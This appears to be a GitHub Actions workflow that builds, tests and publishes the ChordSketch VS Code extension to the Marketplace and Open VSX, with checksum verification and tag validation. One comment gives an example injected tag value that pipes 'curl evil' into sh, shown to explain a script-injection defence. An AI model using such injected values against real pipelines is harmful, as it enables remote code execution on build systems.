name: VS Code Extension

on:
  push:
    branches: [main]
    paths:
      - "packages/vscode-extension/**"
      - "syntaxes/**"
      - ".github/workflows/vscode-extension.yml"
  pull_request:
    paths:
      - "packages/vscode-extension/**"
      - "syntaxes/**"
      - ".github/workflows/vscode-extension.yml"
  # GitHub Release publication triggers the publish job below.
  # This event is path-filter-free, so the publish job always runs on release.
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      tag:
        description: "Tag to publish (e.g. v0.1.0). Leave blank to run CI on HEAD without publishing."
        required: false
        default: ""
        type: string

# Cancel stale PR runs when a new commit is pushed to the same PR so
# that rebase / force-push does not leave two parallel extension
# builds contending for Linux runner capacity (every job here is
# `ubuntu-latest`). `main` pushes, tag pushes, and `workflow_dispatch`
# / `release` events are not grouped with PRs and run to completion.
concurrency:
  group: vscode-extension-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

permissions:
  contents: read

defaults:
  run:
    # See release-verify.yml for the rationale: add `-u` so a typo'd
    # environment-variable reference fails loud. Every `run:` block in
    # this workflow already sets `set -euo pipefail` explicitly, so the
    # default is strictly defense-in-depth (issue #1836).
    shell: bash --noprofile --norc -euo pipefail {0}

jobs:
  build:
    name: Build & Package Extension
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
        # No `ref:` override — always check out main so package-lock.json
        # is present for Node.js caching. Same pattern as #1521.

      - name: Set up Node.js
        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
        with:
          node-version: "22"
          cache: "npm"
          cache-dependency-path: packages/vscode-extension/package-lock.json

      # Build @chordsketch/wasm from source rather than fetching @latest
      # from the npm registry so CI sees the same wasm-bindgen-generated
      # JS surface that the in-tree `crates/wasm` defines on this commit.
      # Pre-#2279-Step-2 this step ran `npm pack @chordsketch/wasm@latest`,
      # which left a publish-lag window where preview.ts could import a
      # wasm export that existed in `crates/wasm/src/lib.rs` but had not
      # yet been published to npm — esbuild then bundles a missing-export
      # reference whose runtime failure is invisible to PR CI.
      #
      # The cost is one Rust + wasm-pack build per PR (~2-3 min cold,
      # ~30s with rust-cache).
      - uses: dtolnay/rust-toolchain@29eef336d9b2848a0b548edc03f92a220660cdb8 # stable
      - uses: ./.github/actions/install-wasm-pack
      - uses: Swatinem/rust-cache@e18b497796c12c097a38f9edb9d0641fb99eee32 # v2
        with:
          # Distinct shared-key per workflow + target so vscode-extension's
          # wasm-pack build does not thrash the cache shared by `wasm.yml`.
          shared-key: vscode-extension-wasm-pack
          save-if: ${{ github.ref == 'refs/heads/main' }}

      - name: Build @chordsketch/wasm (lean) from source
        run: node packages/npm/scripts/build.mjs

      # The extension's esbuild script copies the wasm binary out of
      # `packages/npm-export/` (#2466) because `convertToPdf` calls
      # `render_pdf` from the heavy bundle. Without this build the
      # extension's `npm run build` esbuild step fails to resolve
      # `@chordsketch/wasm` against the local path it was aliased
      # to.
      - name: Build @chordsketch/wasm-export (heavy) from source
        run: node packages/npm-export/scripts/build.mjs

      - name: Install dependencies
        run: npm ci
        working-directory: packages/vscode-extension

      - name: Type-check
        run: npm run lint
        working-directory: packages/vscode-extension

      - name: Unit tests
        run: npm test
        working-directory: packages/vscode-extension

      - name: Build
        run: npm run build
        working-directory: packages/vscode-extension

      # Extension-host integration tests via @vscode/test-cli. Runs after
      # the build step so the compiled `dist/extension.js` is available for
      # the extension development host to load; the `Build` step above is
      # the only production build — `npm run test:integration` deliberately
      # does NOT have a `pretest` hook that re-invokes `npm run build`, so
      # CI does not pay for two esbuild runs per PR.
      #
      # `.vscode-test.mjs` runs each test against two VS Code versions:
      #   - `stable` (latest release)
      #   - `engines.vscode` floor (read dynamically from package.json at
      #     config-load time, so a future engines bump is picked up here
      #     without editing this workflow).
      # Both cells execute in a single `npm run test:integration` invocation
      # — test-cli iterates the matrix internally. The first cold run
      # downloads both VS Code builds (~200 MB combined); subsequent runs
      # reuse the local cache.
      #
      # xvfb-run provides a virtual X display for Electron on the Linux
      # runner. Coverage completes the issue #1918 phased plan:
      # activation + command registration (#1914), LSP handshake
      # negotiation (#1913), preview panel, and the preview
      # WebviewPanelSerializer restart round-trip.
      - name: Compile integration tests
        run: npm run compile:integration
        working-directory: packages/vscode-extension

      - name: Integration tests (VS Code extension host)
        run: xvfb-run -a npm run test:integration
        working-directory: packages/vscode-extension

      - name: Package extension
        run: npm run package
        working-directory: packages/vscode-extension

      - name: Verify packaged files
        run: ./node_modules/.bin/vsce ls
        working-directory: packages/vscode-extension

      - name: Upload VSIX artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: chordsketch-vsix
          path: packages/vscode-extension/*.vsix
          if-no-files-found: error
          retention-days: 7

  build-platform:
    name: Package ${{ matrix.vs_target }} VSIX
    runs-on: ubuntu-latest
    # Release-only matrix that downloads the per-platform chordsketch-lsp
    # binary from the GitHub Release assets (produced by release.yml), places
    # it at server/<platform>-<arch>/chordsketch-lsp[.exe], and packages a
    # platform-specific VSIX. Needed for Tier 3 of the LSP resolver in
    # packages/vscode-extension/src/platform.ts to succeed post-install. See #1786.
    #
    # continue-on-error lets the publish jobs run even when a subset of
    # matrix cells fails (e.g., a transient `gh release download`
    # failure on one platform). Cell failures are still visible in the
    # workflow run's Jobs tab. Without this, a single failed cell marks
    # the whole job failed and GitHub skips both publish jobs entirely,
    # hiding the partial build behind a silent skip. The `Verify
    # expected VSIX count` step inside each publish job is the real
    # guardrail: it fails loudly when fewer than 8 VSIXes are present,
    # so a partial build still blocks publish — just loudly instead of
    # silently. See #1795.
    continue-on-error: true
    if: >-
      github.event_name == 'release' ||
      (github.event_name == 'workflow_dispatch' && inputs.tag != '')
    strategy:
      fail-fast: false
      matrix:
        include:
          - vs_target: linux-x64
            rust_target: x86_64-unknown-linux-gnu
            server_dir: linux-x64
            ext: ""
          - vs_target: linux-arm64
            rust_target: aarch64-unknown-linux-gnu
            server_dir: linux-arm64
            ext: ""
          - vs_target: darwin-x64
            rust_target: x86_64-apple-darwin
            server_dir: darwin-x64
            ext: ""
          - vs_target: darwin-arm64
            rust_target: aarch64-apple-darwin
            server_dir: darwin-arm64
            ext: ""
          - vs_target: win32-x64
            rust_target: x86_64-pc-windows-msvc
            server_dir: win32-x64
            ext: ".exe"
          # Alpine rows deliberately reuse linux server_dir: platform.ts reads
          # process.platform which returns "linux" on Alpine (there is no "alpine"
          # value). The musl binary must land under server/linux-x64 or
          # server/linux-arm64; the alpine-* VSIX channel is what routes it to
          # musl users. Do NOT "fix" this to server/alpine-*/ — that would break
          # Tier 3 resolution on Alpine.
          - vs_target: alpine-x64
            rust_target: x86_64-unknown-linux-musl
            server_dir: linux-x64
            ext: ""
          - vs_target: alpine-arm64
            rust_target: aarch64-unknown-linux-musl
            server_dir: linux-arm64
            ext: ""
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2

      - name: Set up Node.js
        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
        with:
          node-version: "22"
          cache: "npm"
          cache-dependency-path: packages/vscode-extension/package-lock.json

      # Build @chordsketch/wasm from source on the publish path too —
      # see the rationale on the same step in the `build` job above.
      # On a release event the manual `npm publish` of @chordsketch/wasm
      # may not have happened yet, so `@latest` lags the in-tree source.
      - uses: dtolnay/rust-toolchain@29eef336d9b2848a0b548edc03f92a220660cdb8 # stable
      - uses: ./.github/actions/install-wasm-pack
      - uses: Swatinem/rust-cache@e18b497796c12c097a38f9edb9d0641fb99eee32 # v2
        with:
          shared-key: vscode-extension-wasm-pack
          save-if: ${{ github.ref == 'refs/heads/main' }}

      - name: Build @chordsketch/wasm (lean) from source
        run: node packages/npm/scripts/build.mjs

      # The extension's esbuild script copies the wasm binary out of
      # `packages/npm-export/` (#2466) because `convertToPdf` calls
      # `render_pdf` from the heavy bundle. Without this build the
      # extension's `npm run build` esbuild step fails to resolve
      # `@chordsketch/wasm` against the local path it was aliased
      # to.
      - name: Build @chordsketch/wasm-export (heavy) from source
        run: node packages/npm-export/scripts/build.mjs

      - name: Install dependencies
        run: npm ci
        working-directory: packages/vscode-extension

      - name: Build
        run: npm run build
        working-directory: packages/vscode-extension

      - name: Resolve release tag
        id: tag
        # Route the tag through `env:` rather than templating `${{ ... }}`
        # directly into the shell script. Shell interpolation of untrusted
        # input at YAML-template time is the classic Actions script-injection
        # pattern (a tag like `v1.0.0"; curl evil | sh; #` would execute).
        # `env:` + `"$VAR"` defers expansion to bash, which quotes correctly.
        # The regex validation below is defense in depth: even a properly
        # quoted bogus value shouldn't reach `gh release download`.
        env:
          EVENT_NAME: ${{ github.event_name }}
          RELEASE_TAG: ${{ github.event.release.tag_name }}
          INPUT_TAG: ${{ inputs.tag }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "release" ]; then
            TAG="$RELEASE_TAG"
          else
            TAG="$INPUT_TAG"
          fi
          if ! printf '%s' "$TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.-]+)?$'; then
            echo "Rejecting malformed tag: $TAG" >&2
            exit 1
          fi
          echo "tag=$TAG" >> "$GITHUB_OUTPUT"

      - name: Download and verify chordsketch-lsp from release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ steps.tag.outputs.tag }}
          RT: ${{ matrix.rust_target }}
          VS_TARGET: ${{ matrix.vs_target }}
          SERVER_SUBDIR: ${{ matrix.server_dir }}
          EXT: ${{ matrix.ext }}
        run: |
          set -euo pipefail
          # release.yml emits .zip for Windows targets, .tar.gz for everything else.
          # Archive layouts differ (verified against v0.2.1):
          #   - tar.gz: wraps files in a top-level "chordsketch-<tag>-<target>/" dir
          #     (Unix `tar czf ARCHIVE STAGING`)
          #   - zip: files sit at the archive root, no top-level dir
          #     (PowerShell `Compress-Archive -Path "$Staging/*"`)
          # Extraction below uses `unzip -j` and `tar --strip-components=1` to
          # normalise both into SERVER_DIR. `-j` is defense-in-depth against a
          # future release.yml refactor that reintroduces a wrapping directory.
          # Use EXT (.exe on Windows targets) as the archive-format discriminator
          # so adding a future target like win32-arm64 "just works" — the
          # previous `VS_TARGET = win32-x64` check would silently download
          # .tar.gz for a new Windows cell and fail extraction.
          if [ "$EXT" = ".exe" ]; then
            ARCHIVE="chordsketch-${TAG}-${RT}.zip"
          else
            ARCHIVE="chordsketch-${TAG}-${RT}.tar.gz"
          fi
          # Download both the archive and checksums.txt, then verify SHA-256
          # before trusting the archive. The LSP binary auto-executes on user
          # machines when a .cho file is opened, so unsigned trust of a
          # mutable release asset would be a supply-chain hole. release.yml
          # emits checksums.txt alongside archives via `sha256sum`.
          gh release download "$TAG" -R koedame/chordsketch \
            --pattern "$ARCHIVE" \
            --pattern "checksums.txt"
          # Exact-filename match: extract the checksum line whose second
          # whitespace-separated field equals $ARCHIVE, rather than a regex
          # match where dots in ARCHIVE would match any char. Then pipe the
          # single canonical line to `sha256sum -c -` for verification.
          awk -v a="$ARCHIVE" '$2 == a { print; found = 1 } END { exit !found }' \
            checksums.txt | sha256sum -c -
          SERVER_DIR="packages/vscode-extension/server/${SERVER_SUBDIR}"
          mkdir -p "$SERVER_DIR"
          BIN="chordsketch-lsp${EXT}"
          if [[ "$ARCHIVE" == *.zip ]]; then
            unzip -j "$ARCHIVE" "$BIN" -d "$SERVER_DIR/"
          else
            tar xzf "$ARCHIVE" --strip-components=1 -C "$SERVER_DIR/" \
              --wildcards "*/${BIN}"
          fi
          # Fail loud if extraction missed the binary. The Unix exec bit must
          # be set for the LSP to launch at runtime; Windows ignores it.
          test -f "$SERVER_DIR/${BIN}"
          if [ -z "$EXT" ]; then
            chmod +x "$SERVER_DIR/${BIN}"
          fi
          ls -la "$SERVER_DIR/"

      - name: Package platform-specific VSIX
        working-directory: packages/vscode-extension
        env:
          VS_TARGET: ${{ matrix.vs_target }}
        run: ./node_modules/.bin/vsce package --no-dependencies --target "$VS_TARGET"

      - name: Verify binary is inside the VSIX
        working-directory: packages/vscode-extension
        env:
          SERVER_SUBDIR: ${{ matrix.server_dir }}
          EXT: ${{ matrix.ext }}
        run: |
          set -euo pipefail
          VSIX=$(ls *.vsix | head -n1)
          unzip -l "$VSIX" | grep -F "server/${SERVER_SUBDIR}/chordsketch-lsp${EXT}"

      - name: Upload platform VSIX artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: chordsketch-vsix-${{ matrix.vs_target }}
          path: packages/vscode-extension/*.vsix
          if-no-files-found: error
          retention-days: 7

  publish:
    name: Publish to VS Code Marketplace
    needs: [build, build-platform]
    runs-on: ubuntu-latest
    # Publish only on GitHub Release (published) events or when workflow_dispatch supplies a tag.
    #
    # Prerequisites (one-time human setup before this job can succeed):
    #   1. Register publisher "koedame" at https://marketplace.visualstudio.com/manage
    #   2. Generate a Personal Access Token (PAT) with "Marketplace (Publish)" scope
    #      at https://dev.azure.com/koedame/_usersSettings/tokens
    #   3. Create the "vscode-marketplace" environment at
    #      https://github.com/koedame/chordsketch/settings/environments
    #      and add the PAT as the VSCE_PAT environment secret.
    #
    # If the "vscode-marketplace" environment does not exist (fork, fresh instance),
    # GitHub cannot start this job. continue-on-error keeps the overall workflow
    # green when CI succeeded but publishing infrastructure is absent. See #1443.
    continue-on-error: true
    environment:
      name: vscode-marketplace
      url: https://marketplace.visualstudio.com/items?itemName=koedame.chordsketch
    if: >-
      github.event_name == 'release' ||
      (github.event_name == 'workflow_dispatch' && inputs.tag != '')
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
        # No `ref:` override — always check out main so scripts/ is present.
        # Same pattern as #1521.

      - name: Check required secrets present
        # Fails fast when VSCE_PAT is missing so "environment missing → silent
        # skip" turns into a loud, diagnosable error. Paired with the
        # post-release rollup in release-verify.yml which catches the silent
        # case (where the environment gate itself is absent). See #1506.
        env:
          VSCE_PAT: ${{ secrets.VSCE_PAT }}
        run: python3 scripts/check-env-secrets.py --channel vscode-marketplace

      - name: Set up Node.js
        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
        with:
          node-version: "22"
          cache: "npm"
          cache-dependency-path: packages/vscode-extension/package-lock.json

      - name: Install dependencies (for vsce)
        run: npm ci
        working-directory: packages/vscode-extension

      - name: Download universal VSIX artifact
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: chordsketch-vsix
          path: packages/vscode-extension/

      - name: Download platform VSIX artifacts
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          pattern: chordsketch-vsix-*
          merge-multiple: true
          path: packages/vscode-extension/

      - name: Verify expected VSIX count before publishing
        # Fail closed when any platform is missing rather than silently shipping
        # an incomplete set. build-platform is fail-fast: false, so a single
        # missing release asset would otherwise still let the remaining
        # platforms publish and leave the affected platform's users falling back
        # to the universal VSIX (no bundled LSP — the regression #1786 was
        # meant to close).
        # NOTE: EXPECTED must be updated whenever a target is added or removed
        # from the build-platform matrix. 1 universal + N platform entries = N+1.
        working-directory: packages/vscode-extension
        run: |
          set -euo pipefail
          EXPECTED=8
          # nullglob makes *.vsix expand to nothing rather than the literal
          # pattern when no files match, so the count step doesn't abort
          # under pipefail before printing its diagnostic.
          shopt -s nullglob
          files=(*.vsix)
          count=${#files[@]}
          if [ "$count" -ne "$EXPECTED" ]; then
            echo "Expected $EXPECTED VSIXes (1 universal + 7 platform), got $count:" >&2
            printf '  %s\n' "${files[@]}" >&2
            exit 1
          fi

      - name: Publish to Marketplace
        # vsce reads VSCE_PAT from the environment natively (>= 3.x), so no --pat flag needed.
        # Loop per-VSIX so one platform failing does not block the others; each
        # platform-specific VSIX carries its own --target metadata from packaging.
        env:
          VSCE_PAT: ${{ secrets.VSCE_PAT }}
        working-directory: packages/vscode-extension
        run: |
          set -euo pipefail
          status=0
          for vsix in *.vsix; do
            echo "::group::Publishing $vsix"
            ./node_modules/.bin/vsce publish --packagePath "$vsix" || status=1
            echo "::endgroup::"
          done
          exit "$status"

  publish-openvsx:
    name: Publish to Open VSX Registry
    needs: [build, build-platform]
    runs-on: ubuntu-latest
    # Publish only on GitHub Release (published) events or when workflow_dispatch supplies a tag.
    #
    # Prerequisites (one-time human setup before this job can succeed):
    #   1. Create an account on https://open-vsx.org/ (GitHub login)
    #   2. Generate a personal access token at https://open-vsx.org/user-settings/tokens
    #   3. Create the "open-vsx" environment at
    #      https://github.com/koedame/chordsketch/settings/environments
    #      and add the token as the OPEN_VSX_TOKEN environment secret.
    #
    # If the "open-vsx" environment does not exist (fork, fresh instance),
    # GitHub cannot start this job. continue-on-error keeps the overall workflow
    # green when publishing infrastructure is absent. See #1604.
    continue-on-error: true
    environment:
      name: open-vsx
      url: https://open-vsx.org/extension/koedame/chordsketch
    if: >-
      github.event_name == 'release' ||
      (github.event_name == 'workflow_dispatch' && inputs.tag != '')
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
        # No `ref:` override — always check out main so scripts/ is present.

      - name: Check required secrets present
        env:
          OPEN_VSX_TOKEN: ${{ secrets.OPEN_VSX_TOKEN }}
        run: python3 scripts/check-env-secrets.py --channel open-vsx

      - name: Set up Node.js
        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
        with:
          node-version: "22"
          cache: "npm"
          cache-dependency-path: packages/vscode-extension/package-lock.json

      - name: Install dependencies (for ovsx)
        run: npm ci
        working-directory: packages/vscode-extension

      - name: Download universal VSIX artifact
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: chordsketch-vsix
          path: packages/vscode-extension/

      - name: Download platform VSIX artifacts
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          pattern: chordsketch-vsix-*
          merge-multiple: true
          path: packages/vscode-extension/

      - name: Verify expected VSIX count before publishing
        working-directory: packages/vscode-extension
        run: |
          set -euo pipefail
          count=$(ls -1 *.vsix 2>/dev/null | wc -l)
          if [ "$count" -ne 8 ]; then
            echo "Expected 1 universal + 7 platform VSIXes (=8), got $count:" >&2
            ls -1 *.vsix >&2 || true
            exit 1
          fi

      - name: Publish to Open VSX
        # ovsx reads OVSX_PAT from the environment natively (no --pat flag
        # needed), matching the pattern used for vsce + VSCE_PAT above.
        env:
          OVSX_PAT: ${{ secrets.OPEN_VSX_TOKEN }}
        working-directory: packages/vscode-extension
        run: |
          set -euo pipefail
          status=0
          for vsix in *.vsix; do
            echo "::group::Publishing $vsix"
            ./node_modules/.bin/ovsx publish "$vsix" || status=1
            echo "::endgroup::"
          done
          exit "$status"
